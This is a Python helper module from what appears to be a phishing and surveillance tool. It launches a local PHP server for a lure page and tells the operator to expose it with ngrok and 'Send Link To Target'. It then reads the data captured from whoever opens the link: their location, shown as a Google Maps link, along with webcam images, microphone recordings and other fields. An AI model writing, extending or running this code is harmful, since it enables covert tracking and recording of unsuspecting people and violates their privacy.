import subprocess
import time 
import json
import os
from colorama import Fore,Back,Style

def continue_proc(con_status='',con_path='',con_message=''):

    if con_status == "YES_CONTINUE":

        print(Fore.GREEN+"\n [!]"+Fore.RED+f" {con_message}\n")
        with open(f"template/{con_path}","w") as clear_file:
                clear_file.write("")



    elif con_status == "DO_NOT_CONTINUE" and con_message == '' or con_status == "NO_IM_NORMAL":
        
        with open(f"template/{con_path}","w") as clear_file:
                clear_file.write("")
        
        return_menu = input(Fore.YELLOW+"\n Do you want to return to menu? > Y/N : ").upper()
        if return_menu == "Y":
            return "YES_EXIT"

        elif return_menu == "N":
            return "NO_EXIT"


def After_click(after_click_template_name,after_click_path_message='',after_click_status=""):
    time.sleep(5)
    file_size = 0
    try:

        if not os.stat(f"template/{after_click_template_name}").st_size == file_size:

            
            data = open(f"template/{after_click_template_name}","r").read()
            data_decode = json.loads(data)
                
            for i in data_decode:
                if data_decode[i] == None:
                    data_decode[i] = "None"

                print(Fore.WHITE+ " "+i.replace("-"," ")+Fore.GREEN+" : "+Fore.RED+data_decode[i])
                    

            else:
                result = continue_proc(
                    con_status=after_click_status,
                    con_path=after_click_template_name,
                    con_message=after_click_path_message
                    )
                
                return result

    except Exception as Ex:
        print(Ex)
        exit()
            
    else:
        pass


def Before_click(before_click_template_name,before_click_status,before_click_focus):


        file_size = 0
        try:

            if not os.stat(f"template/{before_click_template_name}").st_size == file_size:

                if before_click_focus == "location":
                    
                    data = open(f"template/{before_click_template_name}","r").read()
                    location_file_json_decode = json.loads(data)
                        
                        
                    print(Fore.WHITE+"\n Google Map Link : "+Fore.GREEN+f"https://www.google.com/maps/place/{location_file_json_decode['lat']}+{location_file_json_decode['lon']}")
                            

                    result = continue_proc(
                        con_path=before_click_template_name,
                        con_status=before_click_status
                    )  
                    return result     
                


                
                elif before_click_focus == "webcam":
                    data = open(f"template/{before_click_template_name}","r").read()
                    webcam_file_json_decode = json.loads(data)
                        
                        
                    print(Fore.WHITE+"\n Image "+Fore.GREEN+f"{webcam_file_json_decode['File-Name']} Saved > Please Check /images Folder ")
                            

                    result = continue_proc(
                        con_path=before_click_template_name,
                        con_status=before_click_status
                    )  
                    return result



                
                elif before_click_focus == "microphone":
                    data = open(f"template/{before_click_template_name}","r").read()
                    microphone_file_json_decode = json.loads(data)
                        
                        
                    print(Fore.WHITE+"\n Voice "+Fore.GREEN+f"{microphone_file_json_decode['File-Name']} Saved > Please Check /sounds Folder ")
                            

                    result = continue_proc(
                        con_path=before_click_template_name,
                        con_status=before_click_status
                    )  
                    return result


        except Exception as Ex:
            print(Ex)
            exit()
                
        else:
            pass


def error_handler(error_handler_path_file):

    time.sleep(2)
    STATUS_SIZE_FILE = 0

    if not os.stat(f"template/{error_handler_path_file}").st_size == STATUS_SIZE_FILE:

        read_file_data  = open(f"template/{error_handler_path_file}","r")
        i = read_file_data.read()

        
        try:
            print(Fore.GREEN+" "+i)
            
            with open(f"template/{error_handler_path_file}", 'w') as clear_file_error:
                clear_file_error.write('')

            result = continue_proc(
                con_status="DO_NOT_CONTINUE",
                con_path=error_handler_path_file)
                
            return result
        except Exception as Ex:
            exit(Ex)



def run_php_server(port,dir_name):
    with open(f"log/{dir_name}-php.log","w") as php_log:
        proc_info = subprocess.Popen(("php","-S",f"localhost:{port}","-t",f"template/{dir_name}"),stderr=php_log,stdout=php_log).pid


    with open("Settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
        data["pid"].append(proc_info)


    with open("Settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)


    print(Fore.RED+" [+] "+Fore.GREEN+"Link : "+Fore.WHITE+f"http://localhost:{port}")
    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+f"Please Run NGROK On Port {port} AND Send Link To Target > "+Fore.YELLOW+Back.BLACK+f"ngrok http {port}\n"+Style.RESET_ALL)

